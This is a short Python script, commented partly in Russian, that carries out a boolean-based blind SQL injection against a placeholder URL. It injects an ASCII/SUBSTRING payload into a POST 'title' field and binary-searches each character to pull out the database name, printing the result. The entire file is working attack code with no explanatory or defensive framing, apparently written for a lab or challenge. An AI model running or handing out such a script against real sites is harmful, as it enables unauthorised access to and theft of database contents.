import requests

URL = "http://TARGET_URL_HERE/"  # Замените на целевой URL
TRUE_MARKER = "found."
FALSE_MARKER = "not found."

def is_true(payload):
    data = {
        "title": payload
    }
    r = requests.post(URL, data=data, timeout=5)
    return TRUE_MARKER in r.text and FALSE_MARKER not in r.text

def extract_char(pos):
    low = 32      # printable ASCII
    high = 126

    while low <= high:
        mid = (low + high) // 2
        payload = f"' OR ASCII(SUBSTRING(database(),{pos},1)) > {mid}#"
        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)

def extract_database_name(length):
    name = ""
    for i in range(1, length + 1):
        c = extract_char(i)
        name += c
        print(f"[+] Position {i}: {c}")
    return name

if __name__ == "__main__":
    DB_LENGTH = 4  # ты уже определил
    db_name = extract_database_name(DB_LENGTH)
    print(f"\n[✓] Database name: {db_name}")
